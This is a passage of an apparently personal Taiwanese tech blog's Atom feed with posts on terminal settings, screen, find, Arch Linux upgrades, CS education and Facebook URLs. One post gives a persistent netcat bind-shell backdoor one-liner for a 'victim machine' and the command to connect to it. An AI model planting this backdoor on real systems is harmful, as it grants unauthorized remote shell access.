&lt;li&gt;imacat 上去救援  &lt;/li&gt;
&lt;li&gt;又 crash 啦  &lt;/li&gt;
&lt;li&gt;NOTO SANS 字體會讓 Open Office 當掉  &lt;/li&gt;
&lt;li&gt;https://github.com/adobe-fonts/source-han-sans/issues/27  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;https://igdshare.org/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Firfox Appmaker - orinx  &lt;ul&gt;
&lt;li&gt;Webmaker &lt;a href="https://webmaker.org/"&gt;https://webmaker.org/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Appmaker &lt;a href="https://apps.webmaker.org/designer"&gt;https://apps.webmaker.org/designer&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;疑似 NG0 案例分享 - 雨蒼  &lt;ul&gt;
&lt;li&gt;公民 1985 行動聯盟 - 國會調查兵團  &lt;ul&gt;
&lt;li&gt;PTT 上號昭  &lt;/li&gt;
&lt;li&gt;Skype 開會  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;影片真的超有梗  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;iHaskell - carlsu  &lt;ul&gt;
&lt;li&gt;https://github.com/gibiansky/IHaskell  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我們能有文化的編程 - 大媽  &lt;ul&gt;
&lt;li&gt;我沒有幻燈，你拔不到我的線  &lt;/li&gt;
&lt;li&gt;我們都是碼農，我們都是程序猿  &lt;/li&gt;
&lt;li&gt;已經開始自稱碼畜了  &lt;/li&gt;
&lt;li&gt;如何提高我們程序猿的逼格？  &lt;/li&gt;
&lt;li&gt;Knuth  &lt;ul&gt;
&lt;li&gt;The Art Of Programming  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Literate_programming"&gt;Literate Programming&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Python Leo  &lt;/li&gt;
&lt;li&gt;在這個編程環境中，我感覺我真的有文化了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[加碼] 桌機哥  &lt;ul&gt;
&lt;li&gt;明年有考慮辦桌機 Bof 嗎?  &lt;/li&gt;
&lt;li&gt;有人跟我一樣帶桌機的話可以考慮  &lt;/li&gt;
&lt;li&gt;什麼因緣下讓你帶桌機來?  &lt;/li&gt;
&lt;li&gt;就...剛好沒有筆電可以用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary><category term="Conf"></category><category term="Taiwan"></category><category term="COSCUP"></category><category term="Open Source"></category><category term="Note"></category><category term="Thought"></category></entry><entry><title>Use Option Key as Meta in iTerm2 and Terminal on Mac</title><link href="https://blog.m157q.tw/posts/2014/07/09/use-option-key-as-meta-in-iterm2-and-terminal-on-mac/" rel="alternate"></link><published>2014-07-09T18:46:00+08:00</published><updated>2014-07-09T18:46:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-07-09:posts/2014/07/09/use-option-key-as-meta-in-iterm2-and-terminal-on-mac/</id><summary type="html">&lt;p&gt;I am learning some bash shortcut keys in emacs mode in order to become a better sysytem administrator and just found that Alt+* shortcut keys can't be used in my MacBook Air within iTerm2 and default Terminal.  &lt;/p&gt;
&lt;p&gt;Here are solutions below.  &lt;/p&gt;
&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h3&gt;iTerm2&lt;/h3&gt;
&lt;p&gt;According to this post &lt;a href="http://stackoverflow.com/questions/18923765/bash-keyboard-shortcuts-in-iterm-like-altd-and-altf"&gt;Bash keyboard shortcuts in iTerm like Alt+d and Alt+f &lt;/a&gt;.  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Command + O&lt;/code&gt; to open the iTerm2 profiles  &lt;/li&gt;
&lt;li&gt;Click Edit Profiles  &lt;/li&gt;
&lt;li&gt;Choose left option key as &lt;code&gt;+Esc&lt;/code&gt; or both left and right option key on the bottom right corner  &lt;/li&gt;
&lt;li&gt;Close the iTerm2 Profiles  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;It should works.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Terminal&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Command + ,&lt;/code&gt; to open the Settings of Terminal  &lt;/li&gt;
&lt;li&gt;Check &lt;code&gt;Use option as meta key&lt;/code&gt; on the bottom  &lt;/li&gt;
&lt;li&gt;Close Terminal Settings  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;It should works.  &lt;/p&gt;</summary><category term="Mac"></category><category term="terminal"></category><category term="iTerm2"></category><category term="MetaKey"></category><category term="OptionKey"></category></entry><entry><title>Simple Backdoor by using NetCat</title><link href="https://blog.m157q.tw/posts/2014/07/06/simple-backdoor-by-using-netcat/" rel="alternate"></link><published>2015-10-27T12:13:00+08:00</published><updated>2015-10-27T12:13:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-07-06:posts/2014/07/06/simple-backdoor-by-using-netcat/</id><summary type="html">&lt;h2&gt;The one line script&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nohup bash -c &lt;span class="s1"&gt;&amp;#39;while true; do nc -l -e /bin/bash -p ${port}; done&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;How this works&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;nohup&lt;/code&gt; makes this backdoor immune to SIGHUP  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;bash -c ${string}&lt;/code&gt; will run the &lt;code&gt;${string}&lt;/code&gt; as command  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;nc -l&lt;/code&gt; let nc keep listening on the port  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;nc -e ${sth}&lt;/code&gt; means excute &lt;code&gt;${sth}&lt;/code&gt; after connected  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;nc -p&lt;/code&gt; to choose a port for nc to listen  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;${port}&lt;/code&gt; is the backdoor port set on the victim machine.  &lt;ul&gt;
&lt;li&gt;You can change it to a port number whatever you like.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;use shell scripting &lt;code&gt;while&lt;/code&gt; for keeping listening  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;How to use&lt;/h2&gt;
&lt;p&gt;After run the command above on the victim machine, you can just type  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;victim_ip&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;port&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;to connect to the victim machine and get a bash shell as the same uid which ran the command.  &lt;/p&gt;</summary><category term="NetCat"></category><category term="nc"></category><category term="Backdoor"></category><category term="Security"></category></entry><entry><title>Screen copy mode scrollback 行數不夠</title><link href="https://blog.m157q.tw/posts/2014/05/27/not-enough-lines-for-scrollback-in-screen-copy-mode/" rel="alternate"></link><published>2015-10-28T14:21:00+08:00</published><updated>2015-10-28T14:21:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-05-27:posts/2014/05/27/not-enough-lines-for-scrollback-in-screen-copy-mode/</id><summary type="html">&lt;p&gt;今天剛好有兩個人都問了這個問題  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;「screen 可以回捲的行數不夠怎麼辦?」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以就寫下來記錄一下&lt;br /&gt;
--其實是直接複製貼上--  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;第一種解法：跟 screen 無關&lt;/h2&gt;
&lt;p&gt;關於您的問題應該是不用升級版本就可以解決的&lt;br /&gt;
只要將您的指令 pipe 給 less  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="o"&gt;(&lt;/span&gt;Your &lt;span class="nb"&gt;command&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; less  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;或是使用 &lt;code&gt;&amp;gt;&lt;/code&gt; 將程式的輸出結果導到某個檔案中  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="o"&gt;(&lt;/span&gt;Your &lt;span class="nb"&gt;command&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nv"&gt;$file&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;再使用 &lt;code&gt;less&lt;/code&gt; 或是您慣用的編輯器開啟  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;less $file&lt;/code&gt;, &lt;code&gt;vim $file&lt;/code&gt;, &lt;code&gt;emacs $file&lt;/code&gt;, ...  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;第二種解法：從 screen 的設定下手&lt;/h2&gt;
&lt;p&gt;如果您想要從 screen 的方面下手的話&lt;br /&gt;
可以參考 &lt;a href="http://www.gnu.org/software/screen/manual/screen.html"&gt;http://www.gnu.org/software/screen/manual/screen.html&lt;/a&gt;  &lt;/p&gt;
&lt;h3&gt;情況一：仍未開啟 screen&lt;/h3&gt;
&lt;p&gt;在開啟 &lt;code&gt;screen&lt;/code&gt; 的時候 加上 &lt;code&gt;-h $num&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;$num&lt;/code&gt; 代表可以往上捲幾行  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;screen&lt;/code&gt; 預設為 100  &lt;/p&gt;
&lt;h3&gt;情況二：已經開啟 screen&lt;/h3&gt;
&lt;p&gt;如果已經開啟 &lt;code&gt;screen&lt;/code&gt; 的話&lt;br /&gt;
可以在 &lt;code&gt;screen&lt;/code&gt; 的 cli 環境中輸入  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:defscrollback $num  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;$num&lt;/code&gt; 一樣代表可以往上捲幾行  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;則新開啟的 &lt;code&gt;screen&lt;/code&gt; 分頁會套用此設定  &lt;/p&gt;</summary><category term="CLI"></category><category term="screen"></category><category term="copy mode"></category><category term="history buffer"></category></entry><entry><title>find 指令排除指定路徑</title><link href="https://blog.m157q.tw/posts/2014/05/21/exclude-path-in-find-command/" rel="alternate"></link><published>2015-10-28T14:29:00+08:00</published><updated>2015-10-28T14:29:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-05-21:posts/2014/05/21/exclude-path-in-find-command/</id><summary type="html">&lt;p&gt;為了寫作業用到的&lt;br /&gt;
參考 &lt;a href="http://stackoverflow.com/questions/4210042/exclude-directory-from-find-command"&gt;linux - Exclude directory from find . command - Stack Overflow&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;基本上就是  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ find &lt;span class="nv"&gt;$target_path&lt;/span&gt; -path &lt;span class="nv"&gt;$exclude_path&lt;/span&gt; -prune -o &lt;span class="o"&gt;[&lt;/span&gt;condition&lt;span class="o"&gt;]&lt;/span&gt; -print  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;我自己的用法是  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ find / -path /proc -prune -o -perm &lt;span class="nv"&gt;o&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;w -type f -print  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;用來 print 出整個 &lt;code&gt;/&lt;/code&gt; 底下除了 &lt;code&gt;/proc&lt;/code&gt; 以外所有的 global writable 的 file  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;解答中甚至給出了要排除多個資料夾路徑的寫法  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find &lt;span class="nv"&gt;$target_path&lt;/span&gt; -type d &lt;span class="se"&gt;\(&lt;/span&gt; -path &lt;span class="nv"&gt;$exclude_path1&lt;/span&gt; -o -path &lt;span class="nv"&gt;$exclude_path2&lt;/span&gt; -o -path &lt;span class="nv"&gt;$exclude_path3&lt;/span&gt; &lt;span class="se"&gt;\)&lt;/span&gt; -prune -o -print  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Appendix&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-prune&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;This primary always evaluates to true.  It causes find to not descend into the current file.  Note, the -prune primary has no effect if the -d option was specified.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="find"></category><category term="sysadmin"></category></entry><entry><title>GHC 7.8.2 造成 Arch Linux 無法升級的解法</title><link href="https://blog.m157q.tw/posts/2014/05/21/the-solution-for-system-upgrade-failure-caused-by-ghc-7-8-2/" rel="alternate"></link><published>2015-10-27T13:10:00+08:00</published><updated>2015-10-27T13:10:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-05-21:posts/2014/05/21/the-solution-for-system-upgrade-failure-caused-by-ghc-7-8-2/</id><summary type="html">&lt;p&gt;官方公告 &lt;a href="https://www.archlinux.org/news/managing-haskell-packages-with-ghc-782/"&gt;Managing Haskell packages with GHC 7.8.2&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;裡面寫了  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Moving every package that is not ghc or cabal-install to [community]. This will allow better support of the core common haskell libraries since I do not actually use these packages due to cabal-install.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其實我根本看不懂該怎麼做= ="&lt;br /&gt;
反正我一定不是唯一一個看不懂的(?)&lt;br /&gt;
所以就查到了這篇 &lt;a href="https://bbs.archlinux.org/viewtopic.php?pid=1412908"&gt;[SOLVED] Problems upgrading some haskell packages&lt;/a&gt;&lt;br /&gt;
遇到的情形似乎跟我一樣&lt;br /&gt;
下了 &lt;code&gt;sudo pacman -Syu&lt;/code&gt; 後噴了  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:: haskell-transformers: requires ghc=7.6.3-1  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;然後  &lt;code&gt;pacman -Qs ghc&lt;/code&gt; 後也一樣已經安裝了&lt;br /&gt;
然後底下有人提供了解法  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo pacman -Rcs haskell-transformers  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;把跟 &lt;code&gt;haskell-transformers&lt;/code&gt; 有關的套件都移除掉以後&lt;br /&gt;
再重新下一次 &lt;code&gt;sudo pacman -Syu&lt;/code&gt; 就可以了  &lt;/p&gt;
&lt;p&gt;底下的回覆有人的解釋是  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;haskell-transformers was recently removed from extra.&lt;br /&gt;
It depends on a specific version of ghc.&lt;br /&gt;
There is a newer version of ghc in the repos.&lt;br /&gt;
Since haskell-transformers was removed there's no upgrade path to resolve the issue.&lt;br /&gt;
You'll have to do it manually.&lt;br /&gt;
Edit: Removed from the repos entirely.&lt;br /&gt;
Not moved from extra to community like the other haskell packages.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;恩 應該就是這樣吧  &lt;/p&gt;</summary><category term="Linux"></category><category term="Haskell"></category><category term="Arch Linux"></category><category term="GHC"></category><category term="sysadmin"></category></entry><entry><title>給系上教授的回信</title><link href="https://blog.m157q.tw/posts/2014/04/28/a-reply-email-to-a-professor-of-nctucs/" rel="alternate"></link><published>2014-04-28T17:01:00+08:00</published><updated>2014-04-28T17:01:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-04-28:posts/2014/04/28/a-reply-email-to-a-professor-of-nctucs/</id><summary type="html">&lt;blockquote&gt;
&lt;p&gt;你們對課業繁重與自我興趣與目標之間的抉擇與感受  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我自己目前的情況是課業應付應付不要被當掉就好，&lt;br /&gt;
大部份的課我沒有很認真聽，都在做自己的事。&lt;br /&gt;
有些我認為太無聊的課也會翹掉，&lt;br /&gt;
自己唸書有時候效率比到課堂上聽講還高。&lt;br /&gt;
考試成績也只有班平均左右而已，&lt;br /&gt;
除了極少數真的有興趣的課程（和實作比較相關）例外。&lt;br /&gt;
然後把多的時間花在研究自己有興趣的東西、網站開發的工讀、資安相關的專題&lt;br /&gt;
還有系計中助教的一些工作，&lt;br /&gt;
主要都是想解決自己生活上遇到的問題，都是偏向實作的部分。  &lt;/p&gt;
&lt;p&gt;我個人不排斥理論，但我認為理論應該要和實作相輔相成，&lt;br /&gt;
而不是在課堂上只學一堆理論卻無用武之地，&lt;br /&gt;
(我個人認為作業只能算是練習，而不是實作)&lt;br /&gt;
所以我自己常常是在實作的過程中，遇到某些問題不知道該如何處理時，&lt;br /&gt;
便去查詢或是詢問他人有沒有相關的理論可以用來解決我的問題，&lt;br /&gt;
解決完後再自己把整個過程和解決方法記錄起來。&lt;br /&gt;
這樣的學習方式我自己覺得印象比較深刻，&lt;br /&gt;
不會像課堂上學到的東西，可能考試一考完就忘了，因為沒有學習動機。&lt;br /&gt;
我個人認為學習動機是很重要的一個學習要素，而不是分數。  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;系上同學的心態如何？&lt;br /&gt;
自我主動學習課外特定技術或實作自己的project風氣如何？&lt;br /&gt;
絕大部分同學是功課顧好就好了？&lt;br /&gt;
想做自我主動學習但課業太重了，只好放棄？&lt;br /&gt;
你們認為問題出在哪裡？  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;就我自己的觀察而言，系上的人在心態上可以分成以下幾類：  &lt;/p&gt;
&lt;h3&gt;1. 對課外的技術及實作比較感興趣 (少數)&lt;/h3&gt;
&lt;p&gt;這類人大部份會出現在我們社團內，&lt;br /&gt;
大學以前可能就或多或少有接觸過資訊相關的事物，而且有著一定程度的興趣。&lt;br /&gt;
（通常是針對資工某一個特定領域，而非全部）&lt;br /&gt;
（相信教授也瞭解本系領域涵蓋範圍非常廣）&lt;br /&gt;
在進入本系前，大多數相信著根據自己的興趣進入本系後，&lt;br /&gt;
應該會有時間研究自己感興趣的事物。&lt;br /&gt;
但進來以後發現並非如此，課業佔掉大多數的時間，&lt;br /&gt;
自己有興趣的領域反而沒那麼多時間研究。&lt;br /&gt;
大多數還是會選擇妥協，或多或少維持基本的課業成績（為了拿到畢業證書），&lt;br /&gt;
然後其他的時間就會挪作學習課外相關技術、&lt;br /&gt;
參與實作自己有興趣的專案及相關競賽。&lt;br /&gt;
這類人通常自我解決問題的能力都不會太差，&lt;br /&gt;
知道哪些方法可能獲得答案或是要去哪找答案。&lt;br /&gt;
對這類人來說，興趣與動機是很重要的一個要素，&lt;br /&gt;
會對於他們積極程度和結果造成重大的影響。  &lt;/p&gt;
&lt;h3&gt;2. 幾乎只學學校教的東西 (大多數)&lt;/h3&gt;
&lt;p&gt;這類人佔大多數，基本上就是維持從小到大的學習模式，學校給什麼就學什麼。&lt;br /&gt;
每一個科目都會努力拿到最好看的成績，考試都會努力考到最好，&lt;br /&gt;
唸書唸得很認真，作業準時交，分數就看個人造化，但通常都不會太差。&lt;br /&gt;
（太差的大概是本身就對資工沒興趣或是興趣在其他科系，受迫於家長進入本系）&lt;br /&gt;
但通常對於課堂以外的東西就幾乎沒聽過或是沒興趣，&lt;br /&gt;
也因為系上排除掉作業的實作課程是在不多，基本上不會有什麼額外的實作經驗。&lt;br /&gt;
排除掉課業的時間就是花在非本科系相關的個人興趣上。  &lt;/p&gt;
&lt;h3&gt;3. 學科和課外實作/競賽能力都非常突出 (極少)&lt;/h3&gt;
&lt;p&gt;這類人基本上非常稀少，每屆大概出個 0 ~ 3 位左右。&lt;br /&gt;
基本上就是綜合前兩類人大多數的優點。&lt;br /&gt;
這類人有兩種可能：  &lt;/p&gt;
&lt;p&gt;其一是高中就已經開始接觸資訊領域相關的事物，&lt;br /&gt;
大多數為程式設計競賽參與者，&lt;br /&gt;
因為基本上大一大二大部份的課程對他們來說都已經學過了，俗稱「先修」。&lt;br /&gt;
這類人通常會進入 PCCA 。  &lt;/p&gt;
&lt;p&gt;其二是高中以前沒有接觸過資訊相關領域的事物，&lt;br /&gt;
但確定要就讀資訊工程系後，便自行開始大量涉獵資工相關知識並自主學習，&lt;br /&gt;
顧好學科成績外的時間就投入競賽，&lt;br /&gt;
利用準備競賽的機會來學習更多課外的知識。  &lt;/p&gt;
&lt;p&gt;這類人就我的認識的來說，通常資質都非常優異，&lt;br /&gt;
但還是會以學科成績為主，顧好成績之後再去做其他事。  &lt;/p&gt;
&lt;p&gt;綜合以上所言，回答教授問題  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;系上同學的心態如何？  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;課業成績為主  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;自我主動學習課外特定技術或實作自己的 project 風氣如何？  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;扣除掉系上規定必修的專題課程的話，實在不多。  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;絕大部分同學是功課顧好就好了？  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;是，這裡就是我上面提到的第二類人。&lt;br /&gt;
因為課業就夠重了，剩下的時間想挪給其他非本科系相關的興趣或社團。&lt;br /&gt;
我聽到大多數的想法是：&lt;br /&gt;
「大學是提倡『多元教育』的場所，而不是『職業訓練所』，&lt;br /&gt;
除了課業的學分外，你還得修個社團和愛情的學分。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;想做自我主動學習但課業太重了，只好放棄？  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我想這裡的自我主動學習必須侷限在和資工相關但是課外的技術上。&lt;br /&gt;
這類說法我不太確定，&lt;br /&gt;
我自己認識會主動學習課外相關技術的人中，不會拿課業當藉口，&lt;br /&gt;
反而大多數都是降低花在課業時間的時間比例，把時間拿去投入課外技術。&lt;br /&gt;
少數則是第三類人，兩者都兼顧的很好。  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;你們認為問題出在哪裡？  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;追根究底還是出在台灣的教育制度還有父母的傳統觀念。&lt;br /&gt;
從小到大我們就是接受成績和考試導向為主的填鴨式教育，&lt;br /&gt;
而不是以解決問題為主的教育，&lt;br /&gt;
只要和工程有關的學科，將來就是為了要解決問題而學，&lt;br /&gt;
畢竟工程師就是以比較有系統的方法&lt;br /&gt;
和比較專業的技術去解決生活中遇到問題的人。&lt;br /&gt;
而大多數父母也都會左右選系的結果，&lt;br /&gt;
或根據當時新聞報導的該系畢業後平均薪水，&lt;br /&gt;
或根據該系平均錄取分數的高低排行，&lt;br /&gt;
只有少數人能夠就讀自己有興趣的科系。&lt;br /&gt;
我自己也只能描述問題發生的根源，&lt;br /&gt;
而沒有想到什麼解決方法，或許可以說我比較自私，&lt;br /&gt;
因為我相信我自己現在在做的事不會讓我未來找不到工作，&lt;br /&gt;
而且當我是少數的時候，又更增加我在這方面的優勢。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;以上是我個人的想法，有任何問題都歡迎教授繼續討論。  &lt;/p&gt;</summary><category term="Life"></category><category term="NCTUCS"></category></entry><entry><title>Something about Facebook Photo URL</title><link href="https://blog.m157q.tw/posts/2014/04/15/something-about-facebook-photo-url/" rel="alternate"></link><published>2015-10-26T14:57:00+08:00</published><updated>2015-10-26T14:57:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-04-15:posts/2014/04/15/something-about-facebook-photo-url/</id><summary type="html">&lt;p&gt;有 Facebook 相關開發經驗的應該就不必看了  &lt;/p&gt;
&lt;p&gt;以最近很紅的一段網址來舉例  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;https://www.facebook.com/photo.php?fbid=710043139058199&amp;amp;set=a.231514793577705.59041.100001575585223&amp;amp;type=1  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;其中 &lt;code&gt;fbid=710043139058199&lt;/code&gt;，710043139058199 為此照片的ID，把這串數字接在 &lt;code&gt;www.facebook.com/&lt;/code&gt; 後面，就會連到該張照片的網址。ex: &lt;a href="https://www.facebook.com/710043139058199"&gt;https://www.facebook.com/710043139058199&lt;/a&gt; (看不到別怪我) (非循序流水號，估計跟使用者有關係)  &lt;/li&gt;
&lt;li&gt;再來是 &lt;code&gt;set=a.231514793577705.59041.100001575585223&lt;/code&gt;，這邊可以看到三串數字，分別由 . 隔開。  &lt;ul&gt;
&lt;li&gt;a 估計為 Album 的意思  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;231514793577705&lt;/code&gt; 代表該相片所在的相簿。接在 &lt;code&gt;www.facebook.com/&lt;/code&gt; 後面，可以直接連結到該相簿。 ex:&lt;a href="https://www.facebook.com/231514793577705"&gt;https://www.facebook.com/231514793577705&lt;/a&gt; (看不到也別怪我)  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;59041&lt;/code&gt; 目前未知  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;100001575585223&lt;/code&gt; 代表照片上傳者的 Facebook uid。 接在 &lt;code&gt;www.facebook.com/&lt;/code&gt; 後面，可以直接連結到該使用者的 Facebook 頁面。 ex:&lt;a href="https://www.facebook.com/100001575585223"&gt;https://www.facebook.com/100001575585223&lt;/a&gt; (看不到還是別怪我)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;type 只是相片檢視的模式，不重要。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上面三種不同的連結必須在該使用者有開放相對應的瀏覽權限才看得到  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;另外有一種長這樣，這種應該比較少看到。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://www.facebook.com/photo.php?fbid=A&amp;amp;set=t.B&amp;amp;type=3&amp;amp;theater&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;fbid=A&lt;/code&gt;: A 和上述的一樣，不再進行贅述。  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;set=t.B&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;t 估計為 timeline 的意思  &lt;/li&gt;
&lt;li&gt;而 B 也會是某個使用者的 Facebook uid。前面接上 &lt;code&gt;www.facebook.com/&lt;/code&gt; 一樣可以連結到該使用者的 Facebook 個人頁面。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上自己無聊試出來的  &lt;/p&gt;
&lt;p&gt;其中 Facebook uid 是流水號，也就是相鄰的數字都會是某個 FB 使用者。&lt;br /&gt;
這個我想很多人應該都知道。  &lt;/p&gt;
&lt;p&gt;然後官方提供的 &lt;a href="http://graph.facebook.com"&gt;http://graph.facebook.com&lt;/a&gt; 不錯用&lt;br /&gt;
後面接上 /id 就會有 Open Graph 的資料出現&lt;br /&gt;
(官方工具是在 &lt;a href="https://developers.facebook.com/tools/explorer/"&gt;https://developers.facebook.com/tools/explorer/&lt;/a&gt; 須登入才能使用)&lt;br /&gt;
雖然這部分也會有預設權限就是&lt;br /&gt;
只要對方沒開放瀏覽權限，一樣看不到  &lt;/p&gt;
&lt;p&gt;有空再來 Google 相關的東西或者翻翻 Facebook API 之類的文件，也許會有啥收穫。  &lt;/p&gt;</summary><category term="facebook"></category><category term="URL"></category></entry><entry><title>[Life] 把程式寫好 == 讓社會變好</title><link href="https://blog.m157q.tw/posts/2014/04/12/life-ba-cheng-shi-xie-hao-rang-she-hui-bian-hao/" rel="alternate"></link><published>2014-04-12T16:04:00+08:00</published><updated>2014-04-12T16:04:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-04-12:posts/2014/04/12/life-ba-cheng-shi-xie-hao-rang-she-hui-bian-hao/</id><summary type="html">&lt;p&gt;一場運動 (Compiler)&lt;br /&gt;
看到這個社會中 (Project)&lt;br /&gt;
各種黑暗面和問題啊 (Bugs)&lt;br /&gt;
而且大概也只看到冰山一角  &lt;/p&gt;
